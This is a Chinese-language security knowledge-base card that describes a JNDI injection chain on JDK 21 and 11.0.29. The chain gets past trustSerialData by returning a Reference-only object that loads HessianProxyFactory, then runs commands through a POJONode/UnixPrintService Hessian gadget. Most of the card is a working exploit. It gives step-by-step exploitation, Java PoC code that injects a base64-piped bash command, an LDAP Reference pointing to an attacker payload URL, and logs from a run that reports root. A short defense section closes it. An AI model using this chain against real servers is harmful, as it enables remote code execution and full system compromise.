---
id: web-java-deser-hessian-jndi-reference-only-unixprintservice
title: JDK 21/11.0.29 JNDI trustSerialData 绕过：Reference-only + HessianProxyFactory + POJONode/UnixPrintService 命令执行
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-jndi-reference-only-trustserialdata-unixprintservice
tags:
- java
- hessian
- jndi
- trustserialdata
- reference
- objectfactory
- hessianproxy
- unixprintservice
- pojonode
- jdk21
- deserialization
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V158
  verified_at: '2026-11-06T07:45:49+08:00'
  notes: 已对照原文与截图核对：JDK21/11.0.29 Obj.decodeObject 对 javaSerializedData 先查 trustSerialData（默认 false，图36-37），Reference 的 javaNamingReference 分支不 readObject 故绕过；HessianProxyFactory.getObjectInstance→create→Proxy.newProxyInstance（图30），HessianProxy.invoke sendRequest 读首字节 72('H')→readReply→readObject（图31-34），JndiLoginModule.attemptAuthentication 的 lookup 后 ctx.search 触发代理方法（图29/35）；POJONode(UnixPrintService printer=命令) Hessian 载荷、BaseJsonNode.writeReplace 与 MapDeserializer 两个坑（图38-40）均有截图；图41 JNDIMap 走 Hessian/Exploit，图42 容器 /tmp/pwned 且 root，链路成立。核对修正：卡内 affected_versions 为原文演示的 JDK 11.0.29/21 环境，非原文给出的完整影响区间/修复版本，已 --clear。未验证点：未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/hessian/web-java-deser-hessian-jndi-reference-only-unixprintservice/
draft: false
kb_aliases:
- trustSerialData 绕过
- Reference-only JNDI
- HessianProxyFactory DirContext
- UnixPrintService gadget
- POJONode toString
- JNDI Hessian 高版本绕过
- JNDI Reference 不反序列化绕过
---

## 一句话结论

JDK 21/11.0.29 默认 `com.sun.jndi.ldap.object.trustSerialData=false`，会拒绝 LDAP 的 `javaSerializedData` 反序列化；但 LDAP 可以只返回一个 `Reference`（不涉及反序列化，因此不受 trustSerialData 限制），其 `factoryClassName` 指向本地 `com.caucho.hessian.client.HessianProxyFactory`。等调用方对 lookup 结果调用方法（原文是 `JndiLoginModule` 里的 `DirContext.search`）时，HessianProxy 会向攻击者 HTTP 取 Hessian 响应并 `readReply` 反序列化；再用 `POJONode` 包裹构造好的 `sun.print.UnixPrintService`，即可在 JDK 高版本上执行命令，原文最终拿到 root shell。

## 原理

### 1. trustSerialData 把 javaSerializedData 路封死

- `com.sun.jndi.ldap.Obj.decodeObject(Attributes)` 在处理 `javaSerializedData`（`JAVA_ATTRIBUTES[1]`）前会检查 `VersionHelper.isSerialDataAllowed()`；不允许时抛 `NamingException("Object deserialization is not allowed")`。
- 该开关来自系统属性 `com.sun.jndi.ldap.object.trustSerialData`，在 JDK 21 默认 false，JDK 11.0.29 也已带此修复。因此“LDAP 返回序列化 gadget 字节”的经典 JNDI 打法失效。

### 2. Reference-only 绕过

- `decodeObject` 另有分支处理 `javaNamingReference`（`JAVA_ATTRIBUTES[7]`）：`decodeReference` 会把 LDAP 属性还原成 `Reference` 对象（className、factoryClassName、factoryClassLocation、RefAddr），这条路径**不调用 readObject**，所以不触发 trustSerialData 检查。
- `NamingManager.getObjectInstance` → `getObjectFactoryFromReference(ref, factoryName)` → `helper.loadClass(factoryName)` 从本地 classpath 加载工厂类 → 强转 `ObjectFactory` 并实例化。只要 classpath 有该类即可，`factoryClassLocation` 可为 null。

### 3. HessianProxyFactory 把 lookup 变成二次 Hessian 反序列化

- `com.caucho.hessian.client.HessianProxyFactory` 实现 `ObjectFactory`；其 `getObjectInstance` 读取 Reference 中的 `type`/`url` 等 RefAddr，调用 `create(api, url, loader)`，内部 `new HessianProxy(url, this, api)` 并 `Proxy.newProxyInstance` 返回动态代理。
- `HessianProxy` 是 `InvocationHandler`：对代理调用任意方法都会进入 `invoke` → `sendRequest` 向 attacker URL 发请求 → 读取响应首字节；若为 72（`'H'`）则 `getHessian2Input` → `readReply(method.getReturnType())` → `readObject`，即完整的 Hessian 反序列化。
- 关键在“lookup 之后必须有人调用代理的方法”。原文里 `JndiLoginModule.attemptAuthentication` 做了：
  ```java
  InitialContext iCtx = new InitialContext();
  ctx = (DirContext) iCtx.lookup(userProvider);   // 返回 Hessian 代理
  ...
  ctx.search("", "(uid=" + username + ")", controls);  // 触发 HessianProxy.invoke
  ```
  因此 Reference 的 `className` 与 `type` 都设为 `javax.naming.directory.DirContext`，保证强转与 `search` 调用成立。

### 4. POJONode + UnixPrintService 命令执行

- 攻击者 HTTP 返回 Hessian reply，其中包含 `com.fasterxml.jackson.databind.node.POJONode`，其 `_value` 是反射构造的 `sun.print.UnixPrintService`：`printer` 字段放 `; <命令>;`，`isInvalid=false`，`lpcStatusCom`/`lpcQueueCom` 置空数组。
- 反序列化触发链（原文引用 Magic In Java API）：
  ```text
  Hessian2.readObject
      POJONode.toString
          UnixPrintService.getter
  ```
  `POJONode.toString` 调用内部 value 的 `toString`/getter；`UnixPrintService` 在构造打印状态查询命令时把 `printer` 拼进 `lpc`/`lpstat` 命令并执行，`printer` 中的 `; ... ;` 因此被 shell 解释为额外命令。原文用 `;open -a calculator` 验证，最终换为 base64 编码的反弹 shell，拿到 `/tmp` 下的 root shell。
- 序列化端有两个坑（原文调试）：
  1. `BaseJsonNode.writeReplace` 会干扰 POJONode 序列化，需先移除；
  2. `SerializerFactory` 默认会把 POJONode 当 Map 处理，反序列化回来变成 `HashMap`（`MapDeserializer`），必须自定义 `AbstractSerializerFactory` 对包含 `POJONode` 的类强制使用 `UnsafeSerializer`。

## 触发条件

- 存在 LDAP（或 RMI）JNDI 注入点，攻击者可控制返回的属性，且能返回 `javaNamingReference`；
- 目标 JDK 为 JDK 21 或 11.0.29 等 `trustSerialData=false` 的高版本（这正是本绕过针对的环境）；
- classpath 含 Hessian（`com.caucho.hessian.client.HessianProxyFactory`）、Jackson databind（`POJONode`），且为 Unix/Linux 发行版 JDK（存在 `sun.print.UnixPrintService`）；
- lookup 之后业务/框架会对返回对象调用方法（如 `DirContext.search`、`toString`），否则代理不发起请求；
- 目标可出网访问攻击者 HTTP（Hessian payload）。

## 利用步骤

1. 确认 JNDI 入口、JDK 版本（`trustSerialData` 默认 false）、classpath 有 Hessian 与 Jackson。
2. 生成 Hessian 恶意响应：`POJONode(UnixPrintService(printer=";<command>;"))`，用 `Hessian2Output` + `setAllowNonSerializable(true)` + 强制 `UnsafeSerializer` 序列化。
3. 把它放在攻击者 HTTP 的 `url` 路径下，响应首字节按 Hessian 2 响应格式（`H` + 版本 + `R` + 状态 + 对象）。
4. 构造 LDAP Reference：
   ```java
   Reference ref = new Reference("javax.naming.directory.DirContext",
       "com.caucho.hessian.client.HessianProxyFactory", null);
   ref.add(new StringRefAddr("type", "javax.naming.directory.DirContext"));
   ref.add(new StringRefAddr("url", "http://attacker:3456/hessian_payload"));
   ```
5. 通过 JNDI 注入点让目标 lookup，并在后续代码路径触发代理方法（原文经 `JndiLoginModule` 的 `ctx.search`）。
6. HessianProxy 取回响应并反序列化，`POJONode.toString` → `UnixPrintService` 拼命令执行，获得命令执行/反弹 shell。

## PoC

恶意 Hessian 载荷生成（节选原文修复版）：

```java
Object unsafe = ...; // sun.misc.Unsafe.theUnsafe
Object service = unsafeAllocate(sun.print.UnixPrintService.class);
setField(service, "printer", ";echo dG91Y2ggL3RtcC9wd25lZA== | base64 -d | bash;echo");
setField(service, "isInvalid", false);
setField(service, "lpcStatusCom", new String[]{"", "", "", ""});
setField(service, "lpcQueueCom", new String[]{"", "", "", ""});

POJONode pojoNode = new POJONode(service);

SerializerFactory factory = new SerializerFactory();
factory.setAllowNonSerializable(true);
factory.addFactory(new AbstractSerializerFactory() {
    public Serializer getSerializer(Class cl) {
        return cl.getName().contains("POJONode") ? new UnsafeSerializer(cl) : null;
    }
    public Deserializer getDeserializer(Class cl) { return null; }
});

ByteArrayOutputStream baos = new ByteArrayOutputStream();
Hessian2Output out = new Hessian2Output(baos);
out.setSerializerFactory(factory);
out.writeObject(pojoNode);   // 攻击者 HTTP 返回该对象，按 Hessian reply 封装
out.flush();
```

```text
# LDAP 返回的 Reference（JNDIMap 等工具可直接生成）
className       = javax.naming.directory.DirContext
factoryClassName= com.caucho.hessian.client.HessianProxyFactory
factoryLocation = null
type            = javax.naming.directory.DirContext
url             = http://attacker:3456/hessian_payload
```

原文最终用 `JNDIMap-fixed.jar` 复现，服务端日志：

```text
[LDAP] Received query: /Hessian/Exploit
[Hessian] Triggering HessianProxyFactory Exploit
[Hessian] Payload URL registered: http://192.168.124.16:3456/hessian_payload
[LDAP] Sending Reference object (useReferenceOnly)
[HTTP] Receive request: /hessian_payload
```

随后在容器内 `/tmp` 看到 `pwned`，`whoami` 为 `root`。

## 变体与关联

- 触发方法不限于 `DirContext.search`：`lookup` 结果上的任意方法调用（`toString`、`getAttributes`、业务接口方法）都能进入 `HessianProxy.invoke`；Reference 的 className 要按调用方强转的类型设置。
- Hessian gadget 可替换：Groovy GString、SignedObject 二次反序列化、JDK-only `ProxyLazyValue` 链等；本卡的价值是 `Reference-only` + `HessianProxyFactory` 这条不依赖 `javaSerializedData` 的入口。
- 关联 [[web-java-deser-hessian-proxyfactory-jndi-deserialization]]：同一 `HessianProxyFactory` 原语；本卡补充了 JDK 21 `trustSerialData` 绕过、`DirContext.search` 触发条件与 `UnixPrintService` 高版本 gadget。
- 关联 [[web-java-deser-hessian2-protocol-error-tostring-trigger]]：Hessian2 在协议错误/expect 拼接中隐式调用 `toString`，与本卡 `POJONode.toString` 触发同属 toString 入口。
- 关联 [[web-java-deser-hessian-jdk-only-proxylazyvalue-chain]]：JDK-only 的 toString→ProxyLazyValue 链，可作为 UnixPrintService 的替代 gadget。
- 关联 [[web-java-deserialization-jndi-databricks-jdbc-krbjaasfile-jndi]]：原文的二次 JNDI lookup 由 Databricks JDBC 的 `krbJAASFile` + `JndiLoginModule` 触发。
- 边界：目标非 Unix/Linux JDK 时 `sun.print.UnixPrintService` 不存在；classpath 无 Hessian/Jackson、不能让 lookup 结果被调用方法、或不能出网时链断。

## 检测与防御

- 真正的修复不在 JDK 版本：Reference-only 路径绕过 `trustSerialData`。应禁止不可信 JNDI lookup，或对 `Reference` 的 className/factoryClassName 做白名单/黑名单（至少拒绝 `com.caucho.hessian.client.HessianProxyFactory`）。
- 禁止应用服务器出站访问外部 LDAP/RMI 与非常规 HTTP；对 lookup 后立刻发生的外连做告警。
- Hessian 反序列化启用类白名单/黑名单与 JEP 290 过滤器，拒绝 `sun.print.UnixPrintService`、`POJONode` 等高危类；移除不必要的 Hessian client 与 Jackson 组合依赖。
- 升级 JDK 只能拦 `javaSerializedData`，不能拦本地 `ObjectFactory`；需要同时限制 `NamingManager.getObjectInstance` 可用工厂类。
- 检测：LDAP 返回 `javaNamingReference` 且 factory 为 Hessian；`JndiLoginModule` 发起的 lookup；同一进程随后访问攻击者 HTTP 并反序列化；`UnixPrintService`/`POJONode` 出现在反序列化日志或过滤器告警中。
